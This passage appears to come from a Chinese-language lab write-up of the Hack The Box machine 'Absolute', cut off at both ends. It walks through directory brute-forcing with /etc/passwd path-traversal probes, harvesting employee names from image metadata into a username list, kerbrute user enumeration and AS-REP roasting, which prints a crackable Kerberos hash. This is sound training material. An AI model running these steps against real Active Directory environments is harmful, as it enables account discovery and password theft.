class="hljs-number">334</span>]<br>xn--nckgh0pyb4cb0662e3ze8mpt2h2w6bmjzaoh9a-net.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--u9j5h1btf1e9236ag6b1v8idc0a-jp.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--pcktab2b3dta2oze-jp.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--t8j3b4ef5mpcvq0dvb-jp.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--eckle2a3a6k5eucvec7hu028b33tg-net.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--x8jc3d5hp94mb34d3m4a-jp.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--eckg4cd6wc6i-com.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--t8jxd7cyb-jp.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--<span class="hljs-number">2</span>4-zb4aym5cqhlgl55v9p2b-jp.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--p8jn4h6d6kxd2h2g-jp.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--gckvas0t2a-biz.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--yckc2auxd4b6564dogvcf7g-jp.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--<span class="hljs-number">58</span>j5bk8cwnpc8czq6095c-jp.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--pckj3hf8gj-biz.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--<span class="hljs-number">4</span>gr53rqoa84h99wywlvrxf7n-net.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--swqq1zt9i4xa94dl3f-net.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--y8jp0mua-jp.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--cckj1c2j2bwf6044bomgf76b-net.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--zckwa8eyf040sre5d-jp.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--n8j0ao7f9a7304bz1zayk3ai7h-com.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--czr78lt57a-jp.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--ecki1b5br0ae8iyd3due-jpnet.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--qckyd1cv50v-jp.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br>xn--n8jl84alc9fsf5446c-com.absolute.htb <span class="hljs-params">Status:</span> <span class="hljs-number">400</span> [<span class="hljs-params">Size:</span> <span class="hljs-number">334</span>]<br><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">=</span><br>Finished<br><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">=</span><br><br></code></pre></td></tr></table></figure>
+
+<p>无果，尝试目录爆破</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs gradle">┌──(root㉿kaada)-[<span class="hljs-regexp">/home/</span>kali/Desktop]<br>└─# dirsearch -u http:<span class="hljs-comment">//absolute.htb/</span><br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist-packages<span class="hljs-regexp">/dirsearch/</span>dirsearch.py:<span class="hljs-number">23</span>: UserWarning: pkg_resources is deprecated as an API. See https:<span class="hljs-comment">//setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br>  <span class="hljs-keyword">from</span> pkg_resources <span class="hljs-keyword">import</span> DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.<span class="hljs-number">4.3</span><br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="hljs-number">25</span> | Wordlist <span class="hljs-keyword">size</span>: <span class="hljs-number">11460</span><br><br>Output <span class="hljs-keyword">File</span>: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>reports<span class="hljs-regexp">/http_absolute.htb/</span>__26-<span class="hljs-number">09</span>-<span class="hljs-number">02</span>_12-<span class="hljs-number">32</span>-<span class="hljs-number">58</span>.txt<br><br>Target: http:<span class="hljs-comment">//absolute.htb/</span><br><br>[<span class="hljs-number">12</span>:<span class="hljs-number">32</span>:<span class="hljs-number">58</span>] Starting: <br>[<span class="hljs-number">12</span>:<span class="hljs-number">32</span>:<span class="hljs-number">59</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">312</span>B  - <span class="hljs-regexp">/%2e%2e/</span>/google.com                               <br>[<span class="hljs-number">12</span>:<span class="hljs-number">32</span>:<span class="hljs-number">59</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">146</span>B  - <span class="hljs-regexp">/js  -&gt;  http:/</span><span class="hljs-regexp">/absolute.htb/</span>js/                  <br>[<span class="hljs-number">12</span>:<span class="hljs-number">32</span>:<span class="hljs-number">59</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">312</span>B  - <span class="hljs-regexp">/.%2e/</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e<span class="hljs-regexp">/%2e%2e/</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e<span class="hljs-regexp">/etc/</span>passwd             <br>[<span class="hljs-number">12</span>:<span class="hljs-number">33</span>:<span class="hljs-number">10</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">312</span>B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           <br>[<span class="hljs-number">12</span>:<span class="hljs-number">33</span>:<span class="hljs-number">27</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">312</span>B  - <span class="hljs-regexp">/cgi-bin/</span>.%<span class="hljs-number">2</span>e<span class="hljs-regexp">/%2e%2e/</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e<span class="hljs-regexp">/%2e%2e/</span>etc/passwd     <br>[<span class="hljs-number">12</span>:<span class="hljs-number">33</span>:<span class="hljs-number">30</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">147</span>B  - <span class="hljs-regexp">/css  -&gt;  http:/</span><span class="hljs-regexp">/absolute.htb/</span>css/                <br>[<span class="hljs-number">12</span>:<span class="hljs-number">33</span>:<span class="hljs-number">35</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">149</span>B  - <span class="hljs-regexp">/fonts  -&gt;  http:/</span><span class="hljs-regexp">/absolute.htb/</span>fonts/            <br>[<span class="hljs-number">12</span>:<span class="hljs-number">33</span>:<span class="hljs-number">38</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">150</span>B  - <span class="hljs-regexp">/images  -&gt;  http:/</span><span class="hljs-regexp">/absolute.htb/im</span>ages/          <br>[<span class="hljs-number">12</span>:<span class="hljs-number">33</span>:<span class="hljs-number">38</span>] <span class="hljs-number">403</span> -    <span class="hljs-number">1</span>KB - <span class="hljs-regexp">/images/</span>                                          <br>[<span class="hljs-number">12</span>:<span class="hljs-number">33</span>:<span class="hljs-number">40</span>] <span class="hljs-number">403</span> -    <span class="hljs-number">1</span>KB - <span class="hljs-regexp">/js/</span>                                              <br>                                                                    <br></code></pre></td></tr></table></figure>
+
+<p>没有东西，这里看了一下wp，发现是images目录下的图片有author这个内容</p>
+<blockquote>
+<p><strong>原理</strong>：JPEG 等图片在保存时会写入 EXIF&#x2F;XMP 元数据，其中 <code>Artist</code>、<code>Author</code>、<code>Creator</code> 等字段常常保留了图片制作者的真实姓名。在域渗透的初始信息收集阶段，这些真实姓名是构造用户名字典的绝佳来源——因为企业的 AD 账户命名往往直接从员工姓名派生（如 <code>j.roberts</code>、<code>jroberts</code>）。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 6); <span class="hljs-keyword">do</span> wget http://absolute.htb/images/hero_<span class="hljs-variable">$&#123;i&#125;</span>.jpg; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs ada">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# exiftool hero_1.jpg<br>ExifTool Version Number         : 13.55<br>File Name                       : <span class="hljs-type">hero_1.jpg</span><br>Directory                       : .<br>File Size                       : 407 <span class="hljs-type">kB</span><br>File Modification Date/Time     : 2022:06:07 19:45:20+00:00<br>File <span class="hljs-keyword">Access</span> Date/Time           : 2026:09:02 13:00:07+00:00<br>File Inode Change Date/Time     : 2026:09:02 13:00:07+00:00<br>File Permissions                : -<span class="hljs-type">rw</span>-r<span class="hljs-comment">--r--</span><br>File <span class="hljs-keyword">Type</span>                       <span class="hljs-type">: </span>JPEG<br>File <span class="hljs-keyword">Type</span> <span class="hljs-type">Extension             </span>: jpg<br>MIME <span class="hljs-keyword">Type</span>                       <span class="hljs-type">: </span>image/jpeg<br>Exif Byte Order                 : <span class="hljs-type">Little</span>-endian (Intel, II)<br>X Resolution                    : 72<br>Y Resolution                    : 72<br>Resolution Unit                 : <span class="hljs-type">inches</span><br>Artist                          : <span class="hljs-type">James</span> Roberts<br>Y Cb Cr Positioning             : <span class="hljs-type">Centered</span><br>Quality                         : 60%<br>XMP Toolkit                     : <span class="hljs-type">Image</span>::ExifTool <span class="hljs-number">11.88</span><br>Author                          : <span class="hljs-type">James</span> Roberts<br>Creator Tool                    : <span class="hljs-type">Adobe</span> Photoshop CC <span class="hljs-number">2018</span> Macintosh<br>Derived From Document ID        : 6413<span class="hljs-type">FD608B5C21D0939F910C0EFBBE44</span><br>Derived From Instance ID        : 6413<span class="hljs-type">FD608B5C21D0939F910C0EFBBE44</span><br>Document ID                     : <span class="hljs-type">xmp.did</span>:<span class="hljs-number">887</span>A47FA048811EA8574B646AF4FC464<br>Instance ID                     : <span class="hljs-type">xmp.iid</span>:<span class="hljs-number">887</span>A47F9048811EA8574B646AF4FC464<br>DCT Encode Version              : 100<br>APP14 Flags <span class="hljs-number">0</span>                   : [14], <span class="hljs-type">Encoded</span> <span class="hljs-keyword">with</span> Blend=<span class="hljs-number">1</span> downsampling<br>APP14 Flags <span class="hljs-number">1</span>                   : (<span class="hljs-type">none</span>)<br>Color Transform                 : <span class="hljs-type">YCbCr</span><br>Image Width                     : 1900<br>Image Height                    : 1150<br>Encoding Process                : <span class="hljs-type">Baseline</span> DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : <span class="hljs-type">YCbCr4</span>:<span class="hljs-number">4</span>:<span class="hljs-number">4</span> (<span class="hljs-number">1</span> <span class="hljs-number">1</span>)<br>Image Size                      : 1900<span class="hljs-type">x1150</span><br>Megapixels                      : 2.2<br><br></code></pre></td></tr></table></figure>
+
+<p>针对每张图片的作者生成用户名字典</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">James </span>Roberts<br>Michael Chaffrey<br>Donald Klay<br>Sarah Osvald<br><span class="hljs-keyword">Jeffer </span>Robinson<br>Nicole Smith<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">james</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jamesroberts</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">james.roberts</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jamesrob</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jamerobe</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jamesr</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">j.roberts</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jroberts</span><br><span class="hljs-keyword"></span>rjames<br>r.<span class="hljs-keyword">james</span><br><span class="hljs-keyword"></span>robertsj<br>roberts<br>roberts.<span class="hljs-keyword">j</span><br><span class="hljs-keyword"></span>roberts.<span class="hljs-keyword">james</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jr</span><br><span class="hljs-keyword"></span>michael<br>michaelchaffrey<br>michael.chaffrey<br>michaelc<br>michchaf<br>m.chaffrey<br>mchaffrey<br>cmichael<br>c.michael<br>chaffreym<br>chaffrey<br>chaffrey.m<br>chaffrey.michael<br>mc<br>donald<br>donaldklay<br>donald.klay<br>donaldkl<br>donaklay<br>donaldk<br>d.klay<br>dklay<br>kdonald<br>k.donald<br>klayd<br>klay<br>klay.d<br>klay.donald<br>dk<br>sarah<br>sarahosvald<br>sarah.osvald<br>sarahosv<br>saraosva<br>saraho<br>s.osvald<br>sosvald<br>osarah<br>o.sarah<br>osvalds<br>osvald<br>osvald.s<br>osvald.sarah<br>so<br><span class="hljs-keyword">jeffer</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jefferrobinson</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jeffer.robinson</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jefferro</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jeffrobi</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jefferr</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">j.robinson</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jrobinson</span><br><span class="hljs-keyword"></span>rjeffer<br>r.<span class="hljs-keyword">jeffer</span><br><span class="hljs-keyword"></span>robinsonj<br>robinson<br>robinson.<span class="hljs-keyword">j</span><br><span class="hljs-keyword"></span>robinson.<span class="hljs-keyword">jeffer</span><br><span class="hljs-keyword"></span>nicole<br>nicolesmith<br>nicole.smith<br>nicolesm<br>nicosmit<br>nicoles<br>n.smith<br>nsmith<br>snicole<br>s.nicole<br>smithn<br>smith<br>smith.n<br>smith.nicole<br>ns<br><br></code></pre></td></tr></table></figure>
+
+<p>使用kerbrute进行验证</p>
+<blockquote>
+<p><strong>原理</strong>：Kerberos 预认证阶段，KDC 对”用户不存在”和”用户存在但需要预认证”会返回不同的错误码（<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code> 与 <code>KDC_ERR_PREAUTH_REQUIRED</code>）。kerbrute 正是利用这一差异，在<strong>无需任何有效凭据、且通常不会触发账户锁定</strong>的情况下，快速判定哪些用户名在域中真实存在，从而把庞大的猜测字典收敛为少数几个确认账户。</p>
+</blockquote>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kaada)-[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop]<br>└─<span class="hljs-comment"># ./kerbrute_linux_amd64 userenum --dc dc.absolute.htb -d absolute.htb usernames</span><br><br><br>    __             __               __     <br>   <span class="hljs-symbol">/</span> <span class="hljs-symbol">/_____</span>  _____<span class="hljs-symbol">/</span> <span class="hljs-symbol">/_</span>  _______  __<span class="hljs-symbol">/</span> <span class="hljs-symbol">/____</span> <br>  <span class="hljs-symbol">/</span> <span class="hljs-operator">//</span>_<span class="hljs-symbol">/</span> _ \<span class="hljs-symbol">/</span> ___<span class="hljs-symbol">/</span> __ \<span class="hljs-symbol">/</span> ___<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> __<span class="hljs-symbol">/</span> _ \<br> <span class="hljs-symbol">/</span> ,<span class="hljs-operator">&lt;</span> <span class="hljs-symbol">/</span>  __<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span>  <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span>  <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>  __<span class="hljs-symbol">/</span><br><span class="hljs-operator">/</span>_<span class="hljs-operator">/</span>|_|\___<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>  <span class="hljs-operator">/</span>_.___<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>   \__,_<span class="hljs-operator">/</span>\__<span class="hljs-operator">/</span>\___<span class="hljs-symbol">/</span>                                        <br><br><span class="hljs-params">Version:</span> v1.<span class="hljs-number">0.3</span> (<span class="hljs-number">9</span>dad6e1) <span class="hljs-operator">-</span> <span class="hljs-number">09</span><span class="hljs-symbol">/02/26</span> <span class="hljs-operator">-</span> Ronnie Flathers @ropnop<br><br><span class="hljs-number">2026</span><span class="hljs-symbol">/09/02</span> <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">34</span> <span class="hljs-operator">&gt;</span>  Using KDC(s):<br><span class="hljs-number">2026</span><span class="hljs-symbol">/09/02</span> <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">34</span> <span class="hljs-operator">&gt;</span>  	dc.absolute.htb:<span class="hljs-number">88</span><br><br><span class="hljs-number">2026</span><span class="hljs-symbol">/09/02</span> <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">34</span> <span class="hljs-operator">&gt;</span>  [<span class="hljs-operator">+</span>] VALID <span class="hljs-params">USERNAME:</span>	 j.roberts@absolute.htb<br><span class="hljs-number">2026</span><span class="hljs-symbol">/09/02</span> <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">34</span> <span class="hljs-operator">&gt;</span>  [<span class="hljs-operator">+</span>] VALID <span class="hljs-params">USERNAME:</span>	 m.chaffrey@absolute.htb<br><span class="hljs-number">2026</span><span class="hljs-symbol">/09/02</span> <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">35</span> <span class="hljs-operator">&gt;</span>  [<span class="hljs-operator">+</span>] VALID <span class="hljs-params">USERNAME:</span>	 s.osvald@absolute.htb<br><span class="hljs-number">2026</span><span class="hljs-symbol">/09/02</span> <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">35</span> <span class="hljs-operator">&gt;</span>  [<span class="hljs-operator">+</span>] VALID <span class="hljs-params">USERNAME:</span>	 d.klay@absolute.htb<br><span class="hljs-number">2026</span><span class="hljs-symbol">/09/02</span> <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">35</span> <span class="hljs-operator">&gt;</span>  [<span class="hljs-operator">+</span>] VALID <span class="hljs-params">USERNAME:</span>	 j.robinson@absolute.htb<br><span class="hljs-number">2026</span><span class="hljs-symbol">/09/02</span> <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">35</span> <span class="hljs-operator">&gt;</span>  [<span class="hljs-operator">+</span>] VALID <span class="hljs-params">USERNAME:</span>	 n.smith@absolute.htb<br><span class="hljs-number">2026</span><span class="hljs-symbol">/09/02</span> <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">35</span> <span class="hljs-operator">&gt;</span>  Done<span class="hljs-operator">!</span> Tested <span class="hljs-number">88</span> usernames (<span class="hljs-number">6</span> valid) <span class="hljs-keyword">in</span> <span class="hljs-number">1.010</span> seconds<br>                                                                               <br></code></pre></td></tr></table></figure>
+
+<p>做AS-Rep-Roasting尝试</p>
+<blockquote>
+<p><strong>原理</strong>：正常情况下 Kerberos 要求客户端在 AS-REQ 中携带用时间戳加密的预认证数据，以证明自己掌握口令。若某账户设置了 <code>DONT_REQ_PREAUTH</code> 标志（即关闭预认证），任何人都可以直接向 KDC 索要该用户的 AS-REP，而其中一段是用<strong>用户口令派生的密钥</strong>加密的。攻击者把这段密文离线拿去爆破，命中即得到明文口令——这就是 AS-REP Roasting。下面的输出中只有 <code>d.klay</code> 未设置预认证，因此仅它返回了可爆破的 <code>$krb5asrep$</code> 哈希。</p>
+</blockquote>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># impacket-GetNPUsers -dc-ip dc.absolute.htb -usersfile users.txt absolute.htb/ </span><br>Impacket v0.<span class="hljs-number">14.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="hljs-keyword">in</span> Kerberos database)<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">m</span>.chaffrey doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">s</span>.osvald doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>$krb5asrep$<span class="hljs-number">23</span>$d.klay@ABSOLUTE.HTB:<span class="hljs-number">13</span>ce486a6b1942a15c53e82475894ca9$<span class="hljs-number">71</span>bf72f550a2347ad1de678fe9352d8550a7a3e1f77881a17b97c273b1c92d32eda60e4306d80c1cc2fe539a94477f96664dc9f9ec935aa43f73858694791cbcdfc8b3ed20e0e44bbdbdd4d265441f637066708c3bb24b3ff5c850f18459981286768a5897f189e1681628c81882a7e6571a52e535cfe14cbee482568d8b358b0d5b39ec1a3f2c7567d94d5c771a5657fcfe49c344f14b46fbfab8d1fc1dd6815d9f68b105b576c9893d1a847882aab48cc0757656ffb4915e19b13b92566c3e56e919157cba78733d6822f62aa29501285cab09f268cb82db94fcf2fdd96ce5043293bdae37bd9ac3e02c53<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">j</span>.robinson doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">n</span>.smith doesn&#x27;t have 